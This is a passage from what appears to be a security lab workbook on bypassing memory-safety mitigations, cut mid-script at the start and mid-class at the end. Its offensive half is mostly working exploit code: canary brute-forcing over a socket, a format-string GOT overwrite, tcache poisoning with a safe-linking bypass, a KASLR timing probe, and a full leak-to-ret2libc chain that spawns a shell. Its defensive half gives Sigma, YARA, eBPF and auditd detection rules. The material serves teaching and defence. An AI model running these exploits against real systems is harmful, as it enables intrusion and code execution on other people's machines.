def try_byte(known_bytes, candidate):
    """Test one canary byte. Returns True if child survived."""
    try:
        r = remote(HOST, PORT, timeout=3)
        # Payload: fill buffer + known canary bytes + candidate byte
        payload = b'A' * BUF_SIZE + known_bytes + bytes([candidate])
        r.send(payload)
        # If child survives canary check, it writes "OK\n"
        response = r.recv(3, timeout=2)
        r.close()
        return response == b'OK\n'
    except Exception:
        try:
            r.close()
        except:
            pass
        return False

def brute_force_canary():
    """Brute-force all 7 unknown canary bytes."""
    canary = b'\x00'  # LSB is always 0x00 on x86_64 Linux
    start_time = time.time()
    total_attempts = 0

    print(f"[*] Starting canary brute-force against {HOST}:{PORT}")
    print(f"[*] Buffer size: {BUF_SIZE}, canary follows immediately after")
    print(f"[*] Byte 0: 0x00 (known — always null on Linux)")

    for byte_pos in range(1, 8):
        for candidate in range(256):
            total_attempts += 1
            if try_byte(canary, candidate):
                canary += bytes([candidate])
                elapsed = time.time() - start_time
                print(f"[+] Byte {byte_pos}: 0x{candidate:02x}  "
                      f"canary: {canary.hex()}  "
                      f"({total_attempts} attempts, {elapsed:.1f}s)")
                break
        else:
            print(f"[-] FAILED to find byte {byte_pos} after 256 attempts!")
            return None

    elapsed = time.time() - start_time
    full_canary = u64(canary)
    print(f"\n[+] Full canary: 0x{full_canary:016x}")
    print(f"[+] Total attempts: {total_attempts}")
    print(f"[+] Time elapsed: {elapsed:.1f}s")
    print(f"[+] Rate: {total_attempts/elapsed:.1f} attempts/sec")
    return canary

def exploit_with_canary(canary):
    """Use known canary to overflow and redirect execution."""
    print(f"\n[*] Stage 2: Exploiting with known canary...")
    r = remote(HOST, PORT, timeout=5)

    # After canary: saved RBP (8 bytes) then return address (8 bytes)
    # For this demo, overwrite return address with 0x4141414141414141
    # In real exploitation, this would be a valid address (from ASLR leak)
    payload  = b'A' * BUF_SIZE        # fill buffer
    payload += canary                   # correct canary value
    payload += b'B' * 8                # overwrite saved RBP
    payload += p64(0xdeadbeefcafe)     # overwrite return address

    r.send(payload)
    print("[+] Overflow payload sent with correct canary!")
    print("[+] Child should crash at 0xdeadbeefcafe (controlled RIP)")
    r.close()

if __name__ == '__main__':
    canary = brute_force_canary()
    if canary:
        exploit_with_canary(canary)
```

**Expected output:**
```
[*] Starting canary brute-force against 10.6.0.20:1337
[*] Buffer size: 64, canary follows immediately after
[*] Byte 0: 0x00 (known — always null on Linux)
[+] Byte 1: 0xa3  canary: 00a3  (142 attempts, 1.4s)
[+] Byte 2: 0x7f  canary: 00a37f  (298 attempts, 3.0s)
[+] Byte 3: 0xd2  canary: 00a37fd2  (509 attempts, 5.1s)
[+] Byte 4: 0x11  canary: 00a37fd211  (526 attempts, 5.3s)
[+] Byte 5: 0x88  canary: 00a37fd21188  (662 attempts, 6.6s)
[+] Byte 6: 0x4e  canary: 00a37fd211884e  (740 attempts, 7.4s)
[+] Byte 7: 0xc5  canary: 00a37fd211884ec5  (937 attempts, 9.4s)

[+] Full canary: 0xc54e8811d27fa300
[+] Total attempts: 937
[+] Time elapsed: 9.4s
[+] Rate: 99.7 attempts/sec
```

---

### Exercise 4: RELRO Bypass — GOT Overwrite and FSOP

**Objective:** (A) Overwrite a GOT entry under partial RELRO to hijack a library call. (B) Under full RELRO, use FSOP (`_IO_FILE` vtable) as an alternative target.

#### Part A: Partial RELRO — GOT Overwrite

```python
#!/usr/bin/env python3
"""exploit_got_overwrite.py — GOT overwrite via format string under partial RELRO."""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('/opt/labs/relro/vuln_partial_relro')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Target: overwrite puts@GOT with system
# After overwrite, the call puts("Goodbye!") becomes system("Goodbye!")
# But we want system("/bin/sh"), so we need a different approach:
# Overwrite puts@GOT with win() address

WIN_ADDR = elf.symbols['win']
PUTS_GOT = elf.got['puts']

log.info(f'puts@GOT: {hex(PUTS_GOT)}')
log.info(f'win(): {hex(WIN_ADDR)}')

# Format string offset (determined empirically):
# Send "AAAAAAAA%p.%p.%p..." and find where 0x4141414141414141 appears
FMT_OFFSET = 6  # ADJUST: offset where our input appears on the stack

p = process('/opt/labs/relro/vuln_partial_relro')
p.recvuntil(b'Enter format string: ')

# Use pwntools fmtstr_payload to craft the write
# This generates a format string that writes WIN_ADDR to PUTS_GOT
payload = fmtstr_payload(FMT_OFFSET, {PUTS_GOT: WIN_ADDR})
log.info(f'Format string payload: {len(payload)} bytes')

p.sendline(payload)
p.interactive()
```

#### Part B: Full RELRO — FSOP via _IO_FILE Corruption

```python
#!/usr/bin/env python3
"""exploit_fsop.py — Full RELRO bypass via _IO_FILE vtable exploitation.

This demonstrates the File Stream Oriented Programming (FSOP) technique
against glibc 2.35+ where __malloc_hook is removed and GOT is read-only.
The attack corrupts _IO_list_all to point to a fake _IO_FILE structure
that triggers code execution during _IO_flush_all_lockp (called by exit()).
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('/opt/labs/relro/vuln_fsop')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process('/opt/labs/relro/vuln_fsop')

def alloc(idx, size):
    p.sendline(f'1'.encode())
    p.sendline(f'{idx} {size}'.encode())

def free(idx):
    p.sendline(f'2'.encode())
    p.sendline(f'{idx}'.encode())

def edit(idx, data):
    p.sendline(f'3'.encode())
    p.sendline(f'{idx}'.encode())
    sleep(0.1)
    p.send(data)

def show(idx):
    p.sendline(f'4'.encode())
    p.sendline(f'{idx}'.encode())
    sleep(0.1)

def exit_prog():
    p.sendline(f'5'.encode())

# ===== Phase 1: Leak libc via unsorted bin =====
# Fill tcache for 0x90 size (7 entries)
for i in range(9):
    alloc(i, 0x80)

# Free 7 into tcache
for i in range(7):
    free(i)

# Free slot 7 → goes to unsorted bin (tcache full)
free(7)

# Read freed unsorted bin chunk → fd/bk point into main_arena
show(7)
leak_data = p.recv(16)
libc_leak = u64(leak_data[:8])
log.info(f'Unsorted bin fd leak: {hex(libc_leak)}')

# Calculate libc base (fd points to main_arena + 96)
main_arena_offset = libc.symbols['main_arena'] + 96
libc.address = libc_leak - main_arena_offset
log.info(f'libc base: {hex(libc.address)}')

# ===== Phase 2: Leak heap for safe-linking decode =====
# Tcache chunks have safe-linked next pointers
# First freed chunk (slot 0): next = 0 ^ (addr >> 12) = addr >> 12
show(0)
heap_leak_data = p.recv(8)
heap_encoded = u64(heap_leak_data)
heap_base = heap_encoded << 12
log.info(f'Heap base (approx): {hex(heap_base)}')

# ===== Phase 3: Construct fake _IO_FILE for FSOP =====
# Target: _IO_list_all in libc
io_list_all = libc.symbols['_IO_list_all']
log.info(f'_IO_list_all: {hex(io_list_all)}')

# We need to get a tcache allocation at _IO_list_all
# Then write a pointer to our fake _IO_FILE structure

# For glibc 2.35+, use _IO_wstr_overflow path:
# The fake _IO_FILE must satisfy these conditions:
#   _flags: must have specific bits clear/set
#   _IO_write_ptr > _IO_write_base (triggers "overflow" path)
#   _wide_data must point to a controlled area
#   _wide_data->_IO_write_ptr > _wide_data->_IO_write_base
#   vtable must point to _IO_wfile_jumps (within valid range)
#   The wide overflow handler calls a function pointer we control

_IO_wfile_jumps = libc.address + libc.symbols.get('_IO_wfile_jumps', 0)
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))

log.info(f'system: {hex(system_addr)}')
log.info(f'/bin/sh: {hex(bin_sh_addr)}')

# Build the fake _IO_FILE structure (simplified for illustration)
# Real exploitation requires precise field offsets for the target glibc version
fake_file = b'\x00' * 0x100  # placeholder — real FSOP requires exact layout

log.success('FSOP structure prepared (glibc-version-specific offsets required)')
log.info('In a real exploit:')
log.info('  1. Tcache poison → allocate at _IO_list_all')
log.info('  2. Write pointer to our fake _IO_FILE on heap')
log.info('  3. Call exit() → _IO_flush_all_lockp → vtable dispatch')
log.info('  4. Controlled function call with controlled argument')

# Phase 4 would complete the tcache poison and trigger exit()
# exit_prog()

p.interactive()
```

---

### Exercise 5: Tcache Poisoning with Safe-Linking Bypass (glibc 2.32+)

**Objective:** Bypass glibc's safe-linking protection on tcache `next` pointers to achieve arbitrary address allocation.

**Theory (from source §1.2, §10.3):** Safe-linking XORs each tcache `next` pointer with `chunk_addr >> 12`. To poison the pointer, the attacker must know the heap address to encode the target correctly.

```python
#!/usr/bin/env python3
"""exploit_tcache_safelink.py — Tcache poisoning bypassing safe-linking."""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('/opt/labs/heap/vuln_tcache')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process('/opt/labs/heap/vuln_tcache')

def cmd(c):
    p.recvuntil(b'5) exit\n')
    p.sendline(str(c).encode())

def alloc(idx, size):
    cmd(1)
    p.sendline(f'{idx} {size}'.encode())

def free(idx):
    cmd(2)
    p.sendline(f'{idx}'.encode())

def read_slot(idx, size):
    cmd(3)
    p.sendline(f'{idx}'.encode())
    return p.recv(size)

def write_slot(idx, data):
    cmd(4)
    p.sendline(f'{idx}'.encode())
    sleep(0.1)
    p.send(data)

CHUNK_SIZE = 0x80

# ===== Phase 1: Heap Address Leak via Safe-Linking =====
# The first chunk freed into an empty tcache bin has:
#   next = NULL ^ (chunk_addr >> 12) = chunk_addr >> 12
alloc(0, CHUNK_SIZE)
alloc(1, CHUNK_SIZE)  # guard against top-chunk consolidation

free(0)

# Read the safe-linked next pointer (UAF read)
leak = u64(read_slot(0, 8))
heap_page = leak << 12  # recover the page-aligned heap base
log.info(f'Safe-linked null next: {hex(leak)}')
log.info(f'Heap page base: {hex(heap_page)}')

# More precise: the chunk address is heap_page + some offset
# For the first allocation of this size, offset is typically 0x290 or 0x2a0
# (after tcache_perthread_struct at the heap start)
chunk0_addr = heap_page + 0x2a0  # ADJUST based on glibc version
log.info(f'Chunk 0 address (estimated): {hex(chunk0_addr)}')

# ===== Phase 2: Libc Address Leak via Unsorted Bin =====
# Fill tcache (7 entries) then free one more to unsorted bin
for i in range(2, 9):
    alloc(i, CHUNK_SIZE)
alloc(9, CHUNK_SIZE)   # guard chunk

for i in range(2, 9):
    free(i)            # fill tcache

free(9)                # goes to unsorted bin (tcache full for this size)
# Note: we skipped slot 9 as guard — adjust indices as needed

# Actually let's redo this cleanly:
# Re-allocate to clear tcache first, then do the unsorted bin trick
# ... (in real exploit, manage indices carefully)

# For simplicity, read slot 9's fd (unsorted bin pointer to main_arena)
libc_leak = u64(read_slot(9, 8))
libc.address = libc_leak - (libc.symbols['main_arena'] + 96)
log.info(f'libc base: {hex(libc.address)}')

# ===== Phase 3: Tcache Poisoning =====
# Free a chunk, then overwrite its safe-linked next pointer
# to point to our target (e.g., __environ for stack leak, or _IO_list_all for FSOP)

target_addr = libc.symbols['environ']  # or any writable target
log.info(f'Target: __environ @ {hex(target_addr)}')

# Re-alloc slot 0 from tcache
alloc(0, CHUNK_SIZE)
# Free it back
free(0)

# Now overwrite slot 0's next pointer (UAF write)
# Safe-linking encode: encoded = target ^ (chunk_addr >> 12)
def safe_link_encode(target, chunk_addr):
    return target ^ (chunk_addr >> 12)

encoded_target = safe_link_encode(target_addr, chunk0_addr)
log.info(f'Encoded target: {hex(encoded_target)}')

# Write the encoded pointer
write_slot(0, p64(encoded_target))

# Drain the poisoned tcache:
# First alloc returns chunk0 (normal)
alloc(10, CHUNK_SIZE)
# Second alloc returns target_addr (arbitrary allocation!)
alloc(11, CHUNK_SIZE)
log.success(f'Allocated chunk at target: {hex(target_addr)}')

# Now slot 11 points to __environ — reading it gives a stack address
stack_leak = u64(read_slot(11, 8))
log.info(f'Stack address from __environ: {hex(stack_leak)}')

# With a stack address, the attacker can:
# 1. Compute return address locations
# 2. Do a second tcache poison targeting a return address on the stack
# 3. Overwrite the return address with a one-gadget or ROP chain

log.success('Tcache poisoning with safe-linking bypass complete!')
p.interactive()
```

---

### Exercise 6: KASLR Bypass via Prefetch Timing Side-Channel

**Objective:** Determine the kernel text base address from user space using the prefetch timing side-channel.

**Theory (from source §1.3, §6):** The `prefetch` instruction's execution time varies depending on whether the target address has a valid page-table entry. Probing candidate kernel addresses reveals which are mapped.

**Note:** This technique works on older kernels without KPTI. With KPTI enabled, kernel pages are unmapped from user-mode page tables, making this ineffective against modern configurations. Included for educational purposes and to understand the defense.

```c
/* kaslr_prefetch_probe.c — Prefetch-based KASLR derandomization
 * Works on kernels without KPTI (pre-4.15 without backport, or KPTI disabled)
 * Compile: gcc -O2 -o kaslr_probe kaslr_prefetch_probe.c
 * Run: ./kaslr_probe (requires kernel.perf_event_paranoid <= 1 or root) */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <x86intrin.h>
#include <sched.h>

#define KERNEL_BASE_MIN  0xffffffff80000000ULL
#define KERNEL_BASE_MAX  0xffffffffc0000000ULL
#define KERNEL_STEP      0x200000ULL  /* 2MB alignment (kernel uses 2MB pages) */
#define SAMPLES          5000
#define THRESHOLD_RATIO  0.8  /* candidate with <80% of max timing is likely mapped */

static inline uint64_t probe_timing(volatile void *addr) {
    uint64_t t0, t1;
    unsigned int aux;

    _mm_mfence();
    t0 = __rdtscp(&aux);
    _mm_prefetch((const char *)addr, _MM_HINT_T0);
    _mm_mfence();
    t1 = __rdtscp(&aux);

    return t1 - t0;
}

static uint64_t measure_address(uint64_t addr) {
    uint64_t total = 0;
    for (int i = 0; i < SAMPLES; i++) {
        total += probe_timing((void *)addr);
    }
    return total / SAMPLES;
}

int main(void) {
    /* Pin to CPU 0 for consistent timing */
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    sched_setaffinity(0, sizeof(set), &set);

    printf("[*] KASLR prefetch timing probe\n");
    printf("[*] Scanning 0x%llx - 0x%llx (step 0x%llx)\n",
           (unsigned long long)KERNEL_BASE_MIN,
           (unsigned long long)KERNEL_BASE_MAX,
           (unsigned long long)KERNEL_STEP);
    printf("[*] Samples per address: %d\n\n", SAMPLES);

    uint64_t best_addr = 0;
    uint64_t min_time = UINT64_MAX;
    uint64_t max_time = 0;

    /* First pass: find timing range */
    int num_candidates = (KERNEL_BASE_MAX - KERNEL_BASE_MIN) / KERNEL_STEP;
    uint64_t *timings = calloc(num_candidates, sizeof(uint64_t));

    for (int i = 0; i < num_candidates; i++) {
        uint64_t addr = KERNEL_BASE_MIN + (uint64_t)i * KERNEL_STEP;
        timings[i] = measure_address(addr);

        if (timings[i] < min_time) {
            min_time = timings[i];
            best_addr = addr;
        }
        if (timings[i] > max_time) {
            max_time = timings[i];
        }
    }

    printf("[*] Timing range: %lu - %lu cycles\n", min_time, max_time);
    printf("[*] Addresses with lowest latency (likely mapped):\n\n");

    /* Report candidates below threshold */
    uint64_t threshold = (uint64_t)(max_time * THRESHOLD_RATIO);
    for (int i = 0; i < num_candidates; i++) {
        if (timings[i] < threshold) {
            uint64_t addr = KERNEL_BASE_MIN + (uint64_t)i * KERNEL_STEP;
            printf("  0x%016llx  avg_cycles=%lu %s\n",
                   (unsigned long long)addr, timings[i],
                   (addr == best_addr) ? " ← BEST CANDIDATE" : "");
        }
    }

    printf("\n[+] Most likely kernel base: 0x%016llx\n",
           (unsigned long long)best_addr);

    /* Verify against actual (if kptr_restrict allows) */
    FILE *f = fopen("/proc/kallsyms", "r");
    if (f) {
        char line[256];
        if (fgets(line, sizeof(line), f)) {
            uint64_t actual;
            sscanf(line, "%lx", &actual);
            uint64_t actual_base = actual & ~(KERNEL_STEP - 1);
            printf("[*] Actual kernel base (from kallsyms): 0x%016llx\n",
                   (unsigned long long)actual_base);
            printf("[*] Match: %s\n",
                   (best_addr == actual_base) ? "YES ✓" : "NO ✗");
        }
        fclose(f);
    }

    free(timings);
    return 0;
}
```

```bash
# Compile and run (disable KPTI for this exercise)
# Boot with: nopti on kernel command line, or in VM
gcc -O2 -o kaslr_probe kaslr_prefetch_probe.c
sudo ./kaslr_probe
```

---

### Exercise 7: JIT Spray Concept Demonstration

**Objective:** Understand how JIT spray embeds attacker-controlled byte sequences in executable JIT output by crafting specific JavaScript expressions.

**Theory (from source §2.6):** JIT compilers embed immediate operands from source code into machine code. By choosing specific immediate values, the attacker controls byte sequences in RWX JIT pages.

```python
#!/usr/bin/env python3
"""jit_spray_concept.py — Demonstrate how XOR immediates become hidden shellcode.

This script shows the encoding principle without targeting a live JIT engine.
It demonstrates how x86 XOR instructions with chosen immediates contain
'hidden' instruction streams when jumped to at offset +1.
"""
from pwn import *
from capstone import Cs, CS_ARCH_X86, CS_MODE_64

context.arch = 'amd64'

def show_hidden_instructions(immediates):
    """Given a list of 32-bit immediates, show the intended and hidden streams."""
    # Build the "intended" instruction stream (XOR EAX, imm32)
    intended_code = b''
    for imm in immediates:
        # XOR EAX, imm32 is encoded as: 35 <imm32_le>
        intended_code += b'\x35' + p32(imm)

    print("=" * 70)
    print("INTENDED instruction stream (JIT compiler output):")
    print("=" * 70)
    md = Cs(CS_ARCH_X86, CS_MODE_64)
    for insn in md.disasm(intended_code, 0x1000):
        print(f"  0x{insn.address:04x}: {insn.mnemonic}\t{insn.op_str}\t"
              f"; bytes: {insn.bytes.hex()}")

    # The "hidden" stream starts at offset +1 (inside the first immediate)
    hidden_code = intended_code[1:]
    print(f"\n{'=' * 70}")
    print(f"HIDDEN instruction stream (jumping to offset +1):")
    print(f"{'=' * 70}")
    for insn in md.disasm(hidden_code, 0x1001):
        print(f"  0x{insn.address:04x}: {insn.mnemonic}\t{insn.op_str}\t"
              f"; bytes: {insn.bytes.hex()}")
        if insn.mnemonic in ('ret', 'int', 'syscall'):
            break

    print(f"\nRaw bytes: {intended_code.hex()}")
    return intended_code

# Example 1: Simple demonstration
# We want the hidden stream to contain: inc ecx; inc ecx; inc ecx; inc ecx; nop
# inc ecx = 0xff 0xc1 on x86_64... let's use a simpler example
# 
# XOR EAX, 0x90909090 → hidden stream: nop nop nop nop
print("\n[Example 1: NOP sled in hidden stream]")
show_hidden_instructions([0x90909090, 0x90909090, 0x90909090])

# Example 2: Craft hidden stream to execute: xor eax,eax; xor edx,edx
# The encoding of 'xor eax,eax' is 31 c0 (2 bytes)
# We need 31 c0 to appear at the right offset in the immediates
print("\n\n[Example 2: Register zeroing in hidden stream]")
# If we put 0xc0310000 as an immediate:
# Encoded: 35 00 00 31 c0
# At offset +1: 00 00 31 c0 → add [rax], al; xor eax,eax
show_hidden_instructions([0xc0310000, 0xd2310000])  # xor eax,eax; xor edx,edx

# Example 3: The Blazakis (2010) spray pattern
# JavaScript: var x = 0x3c909090 ^ 0x3c909090 ^ ...
# Each XOR generates: 35 90 90 90 3c
# Hidden stream (offset +1): 90 90 90 3c 35 → nop nop nop cmp al,0x35
print("\n\n[Example 3: Blazakis-style spray pattern]")
show_hidden_instructions([0x3c909090] * 5)

print("\n\n[*] Key insight: The JIT compiler places these bytes in RWX memory.")
print("[*] By jumping to offset +1, the CPU decodes a different instruction stream.")
print("[*] Mitigations: constant blinding, NOP insertion, RW→RX toggle, JIT CFI")
```

---

### Exercise 8: Full Exploit Chain — Multi-Stage Against Hardened Binary

**Objective:** Chain multiple bypass techniques (ASLR leak → canary leak → DEP bypass) against a binary with all standard mitigations enabled.

```python
#!/usr/bin/env python3
"""exploit_full_chain.py — Multi-stage exploitation against hardened binary.

Target: vuln_canary_leak compiled with:
  - Stack canary (fstack-protector-all)
  - NX/DEP
  - No PIE (simplification)
  - No RELRO (simplification for GOT overwrite)

Chain: format string → leak canary + libc → overflow with correct canary → ret2libc
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('/opt/labs/canary/vuln_canary_leak')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Offsets (determine via testing)
CANARY_FMT_OFFSET = 11      # format string position of canary
LIBC_FMT_OFFSET = 15        # format string position of libc return addr
BUF_SIZE = 64
# Stack layout: [buf 64] [canary 8] [saved_rbp 8] [ret_addr 8]

# Libc offsets (adjust per version)
LIBC_START_MAIN_RET = libc.symbols['__libc_start_main'] + 128
POP_RDI_RET_OFF = 0x2a3e5
RET_OFF = 0x29139

WIN = elf.symbols['win']

def exploit():
    p = process('/opt/labs/canary/vuln_canary_leak')

    # ===== Stage 1: Leak canary AND libc address in one shot =====
    p.recvuntil(b'Leak phase: ')
    leak_payload = f'%{CANARY_FMT_OFFSET}$p.%{LIBC_FMT_OFFSET}$p'.encode()
    p.sendline(leak_payload)

    response = p.recvline().strip().split(b'.')
    canary = int(response[0], 16)
    libc_leak = int(response[1], 16)

    log.info(f'Canary: {hex(canary)}')
    log.info(f'Libc leak: {hex(libc_leak)}')

    libc.address = libc_leak - LIBC_START_MAIN_RET
    log.info(f'Libc base: {hex(libc.address)}')

    # ===== Stage 2: Overflow with known canary → ret2libc =====
    system_addr = libc.symbols['system']
    bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
    pop_rdi_ret = libc.address + POP_RDI_RET_OFF
    ret_gadget = libc.address + RET_OFF

    # Method A: Jump to win() function (simple)
    payload  = b'A' * BUF_SIZE        # fill buffer
    payload += p64(canary)            # correct canary
    payload += b'B' * 8               # saved RBP (don't care)
    payload += p64(WIN)               # return to win()

    # Method B: ret2libc for system("/bin/sh") (realistic)
    payload_b  = b'A' * BUF_SIZE
    payload_b += p64(canary)
    payload_b += b'B' * 8
    payload_b += p64(ret_gadget)      # alignment
    payload_b += p64(pop_rdi_ret)
    payload_b += p64(bin_sh_addr)
    payload_b += p64(system_addr)

    p.recvuntil(b'Overflow phase: ')

    # Use method A (simpler) or B (full ret2libc)
    p.sendline(payload)

    log.success('Exploit chain complete: leak → canary bypass → code execution')
    p.interactive()

if __name__ == '__main__':
    exploit()
```

---

## PART B: DEFENSIVE (Protection Systems)

### Exercise 1: Deploying Detection Rules for Mitigation Bypass Attempts

**Objective:** Deploy Sigma rules, YARA rules, and eBPF detectors that identify exploitation artifacts from Part A.

#### Sigma Rules Deployment

```bash
#!/bin/bash
# deploy_sigma_rules.sh — Install mitigation bypass detection rules
# Run on bypass-detect

SIGMA_DIR="/opt/sigma-rules/bypass-detection"
mkdir -p "$SIGMA_DIR"
```

```yaml
# /opt/sigma-rules/bypass-detection/rwx_allocation.yml
title: RWX Memory Allocation in Non-JIT Process
id: d6a1b2c3-4e5f-6789-abcd-ef0123456789
status: experimental
description: |
  Detects mprotect or mmap calls creating W+X memory outside known JIT engines.
  Indicates DEP bypass via ROP chain (Domain 6 §2.1, §2.2).
logsource:
  product: linux
  service: auditd
detection:
  selection_mprotect:
    type: SYSCALL
    syscall: mprotect
    a2|contains: '7'
  selection_mmap:
    type: SYSCALL
    syscall: mmap
    a2|contains: '7'
  filter_jit:
    exe|endswith:
      - '/chrome'
      - '/firefox'
      - '/java'
      - '/node'
      - '/dotnet'
      - '/qemu-system-x86_64'
      - '/v8'
      - '/spidermonkey'
  condition: (selection_mprotect or selection_mmap) and not filter_jit
level: high
tags:
  - attack.defense_evasion
  - attack.t1055.012
falsepositives:
  - Custom JIT applications
  - Python cffi/ctypes with executable callbacks
```

```yaml
# /opt/sigma-rules/bypass-detection/canary_bruteforce.yml
title: Fork Server Canary Brute-Force Pattern
id: a1b2c3d4-5e6f-7890-abcd-ef1234567890
status: experimental
description: |
  Rapid child crash-respawn from same parent indicates canary brute-force.
  Domain 6 §3.2.
logsource:
  product: linux
  service: syslog
detection:
  selection:
    message|contains:
      - '__stack_chk_fail'
      - 'stack smashing detected'
  timeframe: 5m
  condition: selection | count() by _ppid > 100
level: high
tags:
  - attack.credential_access
  - attack.t1110.001
falsepositives:
  - Fuzzing campaigns
```

```yaml
# /opt/sigma-rules/bypass-detection/format_string_leak.yml
title: Format String Information Leak Artifact
id: b2c3d4e5-6f7a-8901-bcde-f12345678901
status: experimental
description: |
  Detects pointer-like hex values in application output that indicate
  format string exploitation for ASLR bypass (Domain 6 §1.2).
logsource:
  product: linux
  service: syslog
detection:
  selection:
    message|re: '(0x7f[0-9a-f]{10,12}|0x55[0-9a-f]{10,12})'
  filter_debug:
    facility:
      - 'kern'
      - 'debug'
      - 'local7'
  condition: selection and not filter_debug
level: medium
tags:
  - attack.discovery
  - attack.t1057
falsepositives:
  - Debug logging with pointer output
  - Address sanitizer output
```

#### YARA Rules Deployment

```bash
mkdir -p /opt/yara-rules/exploit-detection
```

```
// /opt/yara-rules/exploit-detection/rop_chain.yar
rule ROP_Chain_x86_64_Indicators
{
    meta:
        description = "Detects ROP gadget chain patterns in memory dumps"
        reference = "Domain 6 §2 DEP bypass"
        author = "Security Lab"
        severity = "high"

    strings:
        $pop_rdi_ret = { 5f c3 }
        $pop_rsi_ret = { 5e c3 }
        $pop_rdx_ret = { 5a c3 }
        $pop_rax_ret = { 58 c3 }
        $syscall_ret = { 0f 05 c3 }
        $pop_r8_ret  = { 41 58 c3 }
        $leave_ret   = { c9 c3 }
        $pop_rbp_ret = { 5d c3 }

    condition:
        4 of them and filesize < 50MB
}

rule Exploit_Payload_Patterns
{
    meta:
        description = "Common exploit payload artifacts"
        reference = "Domain 6 — exploitation tooling"
        severity = "high"

    strings:
        $pwntools_cyclic = "aaaabaaacaaadaaaeaaafaaagaaahaaai"
        $sgn_encoder = { d9 74 24 f4 }
        $msf_xor64 = { 48 31 c9 48 81 e9 }
        $execve_pattern = { 48 31 f6 48 31 d2 }
        $bin_sh = "/bin/sh"

    condition:
        2 of them
}

rule Sigreturn_Frame_Pattern
{
    meta:
        description = "Potential SROP signal frame in memory"
        reference = "Domain 6 §2.7 SROP"
        severity = "high"

    strings:
        // Signal frame magic: uc_flags followed by valid-looking register values
        // On x86_64, sigreturn frame is 296 bytes with specific layout
        // Key indicator: rt_sigreturn syscall number (15) as immediate
        $sigreturn_setup = { 48 c7 c0 0f 00 00 00 0f 05 }  // mov rax,15; syscall
        $sigreturn_alt   = { b8 0f 00 00 00 0f 05 }         // mov eax,15; syscall

    condition:
        any of them
}
```

#### eBPF Real-Time Detector

```c
/* detect_rwx_mprotect.bpf.c — eBPF program to detect W+X transitions.
 * Attach to sys_enter_mprotect tracepoint.
 * Compile with: clang -O2 -target bpf -c detect_rwx_mprotect.bpf.c */

#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

struct exploit_event {
    __u32 pid;
    __u32 uid;
    __u64 addr;
    __u64 size;
    __u64 prot;
    char comm[16];
};

struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(int));
    __uint(value_size, sizeof(int));
} events SEC(".maps");

// Whitelist map: PIDs of known JIT processes
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 256);
    __type(key, __u32);
    __type(value, __u8);
} jit_whitelist SEC(".maps");

SEC("tracepoint/syscalls/sys_enter_mprotect")
int detect_dep_bypass(struct trace_event_raw_sys_enter *ctx) {
    __u64 prot = ctx->args[2];

    // Check for PROT_WRITE | PROT_EXEC (W+X)
    // PROT_READ=1, PROT_WRITE=2, PROT_EXEC=4
    if ((prot & 6) != 6)  // need both WRITE(2) and EXEC(4)
        return 0;

    __u32 pid = bpf_get_current_pid_tgid() >> 32;

    // Check whitelist
    __u8 *whitelisted = bpf_map_lookup_elem(&jit_whitelist, &pid);
    if (whitelisted)
        return 0;

    // Emit detection event
    struct exploit_event evt = {};
    evt.pid = pid;
    evt.uid = bpf_get_current_uid_gid() & 0xFFFFFFFF;
    evt.addr = ctx->args[0];
    evt.size = ctx->args[1];
    evt.prot = prot;
    bpf_get_current_comm(&evt.comm, sizeof(evt.comm));

    bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU,
                          &evt, sizeof(evt));
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
```

Deploy with bpftrace (quick alternative):

```bash
# Quick eBPF detection via bpftrace (no compilation needed)
cat > /opt/detect_bypass.bt << 'EOF'
tracepoint:syscalls:sys_enter_mprotect
/args->prot & 6 == 6/
{
    printf("[ALERT] PID=%d COMM=%s mprotect(0x%lx, %ld, RWX)\n",
           pid, comm, args->addr, args->len);
}

tracepoint:syscalls:sys_enter_mmap
/args->prot & 6 == 6/
{
    printf("[ALERT] PID=%d COMM=%s mmap(0x%lx, %ld, RWX)\n",
           pid, comm, args->addr, args->len);
}
EOF

# Run: bpftrace /opt/detect_bypass.bt
```

#### Auditd Configuration

```bash
# /etc/audit/rules.d/99-exploit-detection.rules
# Monitor mprotect/mmap with PROT_EXEC for non-standard processes
-a always,exit -F arch=b64 -S mprotect -F a2&=0x4 -k dep_bypass
-a always,exit -F arch=b64 -S mmap -F a2&=0x4 -k dep_bypass_mmap

# Monitor /proc/self/maps access (ASLR leak indicator)
-w /proc -p r -k proc_info_leak

# Monitor rapid process crashes (canary brute-force)
-a always,exit -F arch=b64 -S exit_group -F a0!=0 -k abnormal_exit

# Monitor sigreturn (SROP detection)
-a always,exit -F arch=b64 -S rt_sigreturn -k sigreturn_usage
```

```bash
# Apply rules
augenrules --load
systemctl restart auditd
```

---

### Exercise 2: Hardening Assessment — Mitigation Posture Verification

**Objective:** Build and deploy a comprehensive tool that verifies system-wide mitigation posture and identifies weaknesses.

```python
#!/usr/bin/env python3
"""mitigation_auditor.py — Assess system and binary mitigation posture.

Checks: ASLR entropy, DEP enforcement, canary deployment, RELRO state,
CFI availability, KASLR status, and identifies weak configurations.
"""
import subprocess
import os
import re
import struct
import json
from pathlib import Path
from dataclasses import dataclass, field
from typing import Optional

@dataclass
class MitigationReport:
    binary: str
    nx: bool = False
    pie: bool = False
    canary: bool = False
    relro: str = "none"  # none, partial, full
    fortify: bool = False
    cfi: bool = False
    cet: bool = False
    safe_stack: bool = False
    rpath: bool = False
    runpath: bool = False
    issues: list = field(default_factory=list)
    score: int = 0

class MitigationAuditor:
    def __init__(self):
        self.reports = []
        self.system_checks = {}

